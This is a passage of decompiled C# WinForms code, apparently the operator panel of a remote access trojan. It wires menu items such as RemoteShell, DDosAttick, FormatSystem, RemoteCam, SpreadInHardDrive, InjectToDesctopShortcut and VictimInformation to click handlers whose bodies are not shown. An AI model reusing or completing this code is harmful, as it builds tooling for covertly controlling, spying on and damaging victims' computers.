		internal virtual ToolStripMenuItem RunFileToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RunFileToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._RunFileToolStripMenuItem = value;
			}
		}

		internal virtual ToolStripMenuItem FromLinkToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._FromLinkToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._FromLinkToolStripMenuItem = value;
			}
		}

		internal virtual ToolStripMenuItem FromDiskToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._FromDiskToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._FromDiskToolStripMenuItem = value;
			}
		}

		internal virtual ToolStripMenuItem ScriptToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ScriptToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ScriptToolStripMenuItem = value;
			}
		}

		internal virtual ToolStripMenuItem RemoteShellToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RemoteShellToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._RemoteShellToolStripMenuItem = value;
			}
		}

		internal virtual ToolStripMenuItem OpenChatToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._OpenChatToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._OpenChatToolStripMenuItem = value;
			}
		}

		internal virtual ToolStripMenuItem ServerToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ServerToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ServerToolStripMenuItem = value;
			}
		}

		internal virtual ToolStripMenuItem UpdateToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._UpdateToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._UpdateToolStripMenuItem = value;
			}
		}

		internal virtual ToolStripMenuItem FromDISKToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._FromDISKToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._FromDISKToolStripMenuItem1 = value;
			}
		}

		internal virtual ToolStripMenuItem FromLINKToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._FromLINKToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._FromLINKToolStripMenuItem1 = value;
			}
		}

		internal virtual ToolStripMenuItem UninstallToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._UninstallToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._UninstallToolStripMenuItem = value;
			}
		}

		internal virtual ToolStripMenuItem RestartToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RestartToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._RestartToolStripMenuItem = value;
			}
		}

		internal virtual ToolStripMenuItem CloseToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CloseToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._CloseToolStripMenuItem = value;
			}
		}

		internal virtual ToolStripMenuItem DisconnectToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._DisconnectToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._DisconnectToolStripMenuItem = value;
			}
		}

		internal virtual ToolStripMenuItem RenameToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RenameToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._RenameToolStripMenuItem = value;
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStripMenuItem2 = value;
			}
		}

		internal virtual ToolStripMenuItem DDosAttickToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._DDosAttickToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DDosAttickToolStripMenuItem_Click);
				bool flag = this._DDosAttickToolStripMenuItem != null;
				if (flag)
				{
					this._DDosAttickToolStripMenuItem.Click -= value2;
				}
				this._DDosAttickToolStripMenuItem = value;
				flag = (this._DDosAttickToolStripMenuItem != null);
				if (flag)
				{
					this._DDosAttickToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem FormatSystemToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._FormatSystemToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.FormatSystemToolStripMenuItem_Click);
				bool flag = this._FormatSystemToolStripMenuItem != null;
				if (flag)
				{
					this._FormatSystemToolStripMenuItem.Click -= value2;
				}
				this._FormatSystemToolStripMenuItem = value;
				flag = (this._FormatSystemToolStripMenuItem != null);
				if (flag)
				{
					this._FormatSystemToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual NotifyIcon NotifyIcon1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NotifyIcon1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.NotifyIcon1_MouseDoubleClick);
				bool flag = this._NotifyIcon1 != null;
				if (flag)
				{
					this._NotifyIcon1.MouseDoubleClick -= value2;
				}
				this._NotifyIcon1 = value;
				flag = (this._NotifyIcon1 != null);
				if (flag)
				{
					this._NotifyIcon1.MouseDoubleClick += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ExtrasToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ExtrasToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ExtrasToolStripMenuItem = value;
			}
		}

		internal virtual ToolStripMenuItem SendMsgboxToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SendMsgboxToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._SendMsgboxToolStripMenuItem = value;
			}
		}

		internal virtual ToolStripMenuItem ComputerToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ComputerToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ComputerToolStripMenuItem1 = value;
			}
		}

		internal virtual ToolStripMenuItem ShutDownToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ShutDownToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ShutDownToolStripMenuItem1_Click);
				bool flag = this._ShutDownToolStripMenuItem1 != null;
				if (flag)
				{
					this._ShutDownToolStripMenuItem1.Click -= value2;
				}
				this._ShutDownToolStripMenuItem1 = value;
				flag = (this._ShutDownToolStripMenuItem1 != null);
				if (flag)
				{
					this._ShutDownToolStripMenuItem1.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem RestartToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RestartToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RestartToolStripMenuItem1_Click);
				bool flag = this._RestartToolStripMenuItem1 != null;
				if (flag)
				{
					this._RestartToolStripMenuItem1.Click -= value2;
				}
				this._RestartToolStripMenuItem1 = value;
				flag = (this._RestartToolStripMenuItem1 != null);
				if (flag)
				{
					this._RestartToolStripMenuItem1.Click += value2;
				}
			}
		}

		internal virtual ImageList im1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._im1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._im1 = value;
			}
		}

		internal virtual ContextMenuStrip CM3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CM3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._CM3 = value;
			}
		}

		internal virtual ToolStripMenuItem HideMonitorToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._HideMonitorToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.HideMonitorToolStripMenuItem_Click);
				bool flag = this._HideMonitorToolStripMenuItem != null;
				if (flag)
				{
					this._HideMonitorToolStripMenuItem.Click -= value2;
				}
				this._HideMonitorToolStripMenuItem = value;
				flag = (this._HideMonitorToolStripMenuItem != null);
				if (flag)
				{
					this._HideMonitorToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ShowMonitorToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ShowMonitorToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ShowMonitorToolStripMenuItem_Click);
				bool flag = this._ShowMonitorToolStripMenuItem != null;
				if (flag)
				{
					this._ShowMonitorToolStripMenuItem.Click -= value2;
				}
				this._ShowMonitorToolStripMenuItem = value;
				flag = (this._ShowMonitorToolStripMenuItem != null);
				if (flag)
				{
					this._ShowMonitorToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem RemoteDesktopToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RemoteDesktopToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RemoteDesktopToolStripMenuItem_Click_1);
				bool flag = this._RemoteDesktopToolStripMenuItem != null;
				if (flag)
				{
					this._RemoteDesktopToolStripMenuItem.Click -= value2;
				}
				this._RemoteDesktopToolStripMenuItem = value;
				flag = (this._RemoteDesktopToolStripMenuItem != null);
				if (flag)
				{
					this._RemoteDesktopToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem RemoteCamToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RemoteCamToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._RemoteCamToolStripMenuItem = value;
			}
		}

		internal virtual ToolStripMenuItem CDToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CDToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._CDToolStripMenuItem = value;
			}
		}

		internal virtual ToolStripMenuItem OpenCDToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._OpenCDToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._OpenCDToolStripMenuItem = value;
			}
		}

		internal virtual ToolStripMenuItem CloseCDToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CloseCDToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CloseCDToolStripMenuItem_Click);
				bool flag = this._CloseCDToolStripMenuItem != null;
				if (flag)
				{
					this._CloseCDToolStripMenuItem.Click -= value2;
				}
				this._CloseCDToolStripMenuItem = value;
				flag = (this._CloseCDToolStripMenuItem != null);
				if (flag)
				{
					this._CloseCDToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem TextToSpeechToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextToSpeechToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.TextToSpeechToolStripMenuItem_Click);
				bool flag = this._TextToSpeechToolStripMenuItem != null;
				if (flag)
				{
					this._TextToSpeechToolStripMenuItem.Click -= value2;
				}
				this._TextToSpeechToolStripMenuItem = value;
				flag = (this._TextToSpeechToolStripMenuItem != null);
				if (flag)
				{
					this._TextToSpeechToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ErrorMessageToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ErrorMessageToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ErrorMessageToolStripMenuItem = value;
			}
		}

		internal virtual ToolStripMenuItem InformationMessageToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._InformationMessageToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._InformationMessageToolStripMenuItem = value;
			}
		}

		internal virtual ToolStripMenuItem QuestionMessageToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._QuestionMessageToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.QuestionMessageToolStripMenuItem_Click);
				bool flag = this._QuestionMessageToolStripMenuItem != null;
				if (flag)
				{
					this._QuestionMessageToolStripMenuItem.Click -= value2;
				}
				this._QuestionMessageToolStripMenuItem = value;
				flag = (this._QuestionMessageToolStripMenuItem != null);
				if (flag)
				{
					this._QuestionMessageToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ExlamationMessageToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ExlamationMessageToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ExlamationMessageToolStripMenuItem_Click);
				bool flag = this._ExlamationMessageToolStripMenuItem != null;
				if (flag)
				{
					this._ExlamationMessageToolStripMenuItem.Click -= value2;
				}
				this._ExlamationMessageToolStripMenuItem = value;
				flag = (this._ExlamationMessageToolStripMenuItem != null);
				if (flag)
				{
					this._ExlamationMessageToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem LogOffToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LogOffToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.LogOffToolStripMenuItem_Click);
				bool flag = this._LogOffToolStripMenuItem != null;
				if (flag)
				{
					this._LogOffToolStripMenuItem.Click -= value2;
				}
				this._LogOffToolStripMenuItem = value;
				flag = (this._LogOffToolStripMenuItem != null);
				if (flag)
				{
					this._LogOffToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual PictureBox P1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._P1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.P1_Click_1);
				bool flag = this._P1 != null;
				if (flag)
				{
					this._P1.Click -= value2;
				}
				this._P1 = value;
				flag = (this._P1 != null);
				if (flag)
				{
					this._P1.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem WebsiteToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._WebsiteToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._WebsiteToolStripMenuItem = value;
			}
		}

		internal virtual ToolStripMenuItem OpenWebPageToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._OpenWebPageToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.OpenWebPageToolStripMenuItem1_Click);
				bool flag = this._OpenWebPageToolStripMenuItem1 != null;
				if (flag)
				{
					this._OpenWebPageToolStripMenuItem1.Click -= value2;
				}
				this._OpenWebPageToolStripMenuItem1 = value;
				flag = (this._OpenWebPageToolStripMenuItem1 != null);
				if (flag)
				{
					this._OpenWebPageToolStripMenuItem1.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem BlockWebpageToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._BlockWebpageToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.BlockWebpageToolStripMenuItem_Click);
				bool flag = this._BlockWebpageToolStripMenuItem != null;
				if (flag)
				{
					this._BlockWebpageToolStripMenuItem.Click -= value2;
				}
				this._BlockWebpageToolStripMenuItem = value;
				flag = (this._BlockWebpageToolStripMenuItem != null);
				if (flag)
				{
					this._BlockWebpageToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem SpreadInHardDriveToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SpreadInHardDriveToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.SpreadInHardDriveToolStripMenuItem1_Click);
				bool flag = this._SpreadInHardDriveToolStripMenuItem1 != null;
				if (flag)
				{
					this._SpreadInHardDriveToolStripMenuItem1.Click -= value2;
				}
				this._SpreadInHardDriveToolStripMenuItem1 = value;
				flag = (this._SpreadInHardDriveToolStripMenuItem1 != null);
				if (flag)
				{
					this._SpreadInHardDriveToolStripMenuItem1.Click += value2;
				}
			}
		}

		internal virtual Panel Panel1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel1 = value;
			}
		}

		internal virtual Panel Panel2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel2 = value;
			}
		}

		internal virtual ToolStripMenuItem TaskbarToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TaskbarToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TaskbarToolStripMenuItem = value;
			}
		}

		internal virtual ToolStripMenuItem HideToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._HideToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._HideToolStripMenuItem = value;
			}
		}

		internal virtual ToolStripMenuItem ShowToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ShowToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ShowToolStripMenuItem1 = value;
			}
		}

		internal virtual System.Windows.Forms.Timer Timer3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Timer3 = value;
			}
		}

		internal virtual System.Windows.Forms.Timer ecran
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ecran;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ecran_Tick);
				bool flag = this._ecran != null;
				if (flag)
				{
					this._ecran.Tick -= value2;
				}
				this._ecran = value;
				flag = (this._ecran != null);
				if (flag)
				{
					this._ecran.Tick += value2;
				}
			}
		}

		internal virtual ToolStripSeparator ToolStripSeparator1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripSeparator1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStripSeparator1 = value;
			}
		}

		internal virtual ToolStripMenuItem ChangeVictimColorToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ChangeVictimColorToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ChangeVictimColorToolStripMenuItem_Click);
				bool flag = this._ChangeVictimColorToolStripMenuItem != null;
				if (flag)
				{
					this._ChangeVictimColorToolStripMenuItem.Click -= value2;
				}
				this._ChangeVictimColorToolStripMenuItem = value;
				flag = (this._ChangeVictimColorToolStripMenuItem != null);
				if (flag)
				{
					this._ChangeVictimColorToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripSeparator ToolStripSeparator2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripSeparator2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStripSeparator2 = value;
			}
		}

		internal virtual ToolStripSeparator ToolStripSeparator3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripSeparator3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStripSeparator3 = value;
			}
		}

		internal virtual ToolStripMenuItem InjectToDesctopShortcutToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._InjectToDesctopShortcutToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.InjectToDesctopShortcutToolStripMenuItem_Click);
				bool flag = this._InjectToDesctopShortcutToolStripMenuItem != null;
				if (flag)
				{
					this._InjectToDesctopShortcutToolStripMenuItem.Click -= value2;
				}
				this._InjectToDesctopShortcutToolStripMenuItem = value;
				flag = (this._InjectToDesctopShortcutToolStripMenuItem != null);
				if (flag)
				{
					this._InjectToDesctopShortcutToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripSeparator ToolStripSeparator4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripSeparator4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStripSeparator4 = value;
			}
		}

		internal virtual ToolStripSeparator ToolStripSeparator6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripSeparator6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStripSeparator6 = value;
			}
		}

		internal virtual ToolStripMenuItem VictimInformationToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._VictimInformationToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._VictimInformationToolStripMenuItem = value;
			}
		}

		internal virtual ImageList ImageList1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ImageList1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ImageList1 = value;
			}
		}

		internal virtual logs Logs1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Logs1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Logs1 = value;
			}
		}

		internal virtual ContextMenuStrip ContextMenuStrip3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContextMenuStrip3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				CancelEventHandler value2 = new CancelEventHandler(this.ContextMenuStrip3_Opening);
				bool flag = this._ContextMenuStrip3 != null;
				if (flag)
				{
					this._ContextMenuStrip3.Opening -= value2;
				}
				this._ContextMenuStrip3 = value;
				flag = (this._ContextMenuStrip3 != null);
				if (flag)
				{
					this._ContextMenuStrip3.Opening += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ManagerToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ManagerToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ManagerToolStripMenuItem = value;
			}
		}

		internal virtual ToolStripMenuItem HhhhhToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._HhhhhToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.HhhhhToolStripMenuItem_Click);
				bool flag = this._HhhhhToolStripMenuItem != null;
				if (flag)
				{
					this._HhhhhToolStripMenuItem.Click -= value2;
				}
				this._HhhhhToolStripMenuItem = value;
				flag = (this._HhhhhToolStripMenuItem != null);
				if (flag)
				{
					this._HhhhhToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem HhhhhhToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._HhhhhhToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.HhhhhhToolStripMenuItem_Click);
				bool flag = this._HhhhhhToolStripMenuItem != null;
				if (flag)
				{
					this._HhhhhhToolStripMenuItem.Click -= value2;
				}
				this._HhhhhhToolStripMenuItem = value;
				flag = (this._HhhhhhToolStripMenuItem != null);
				if (flag)
				{
					this._HhhhhhToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem YyyyyyyyToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._YyyyyyyyToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.YyyyyyyyToolStripMenuItem_Click);
				bool flag = this._YyyyyyyyToolStripMenuItem != null;
				if (flag)
				{
					this._YyyyyyyyToolStripMenuItem.Click -= value2;
				}
				this._YyyyyyyyToolStripMenuItem = value;
				flag = (this._YyyyyyyyToolStripMenuItem != null);
				if (flag)
				{
					this._YyyyyyyyToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem HhhhhhhhToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._HhhhhhhhToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.HhhhhhhhToolStripMenuItem_Click);
				bool flag = this._HhhhhhhhToolStripMenuItem != null;
				if (flag)
				{
					this._HhhhhhhhToolStripMenuItem.Click -= value2;
				}
				this._HhhhhhhhToolStripMenuItem = value;
				flag = (this._HhhhhhhhToolStripMenuItem != null);
				if (flag)
				{
					this._HhhhhhhhToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem GgggggggToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GgggggggToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.GgggggggToolStripMenuItem_Click);
				bool flag = this._GgggggggToolStripMenuItem != null;
				if (flag)
				{
					this._GgggggggToolStripMenuItem.Click -= value2;
				}
				this._GgggggggToolStripMenuItem = value;
				flag = (this._GgggggggToolStripMenuItem != null);
				if (flag)
				{
					this._GgggggggToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ServicesToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ServicesToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ServicesToolStripMenuItem_Click);
				bool flag = this._ServicesToolStripMenuItem != null;
				if (flag)
				{
					this._ServicesToolStripMenuItem.Click -= value2;
				}
				this._ServicesToolStripMenuItem = value;
				flag = (this._ServicesToolStripMenuItem != null);
				if (flag)
				{
					this._ServicesToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem MensagemChatToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._MensagemChatToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.MensagemChatToolStripMenuItem_Click);
				bool flag = this._MensagemChatToolStripMenuItem != null;
				if (flag)
				{
					this._MensagemChatToolStripMenuItem.Click -= value2;
				}
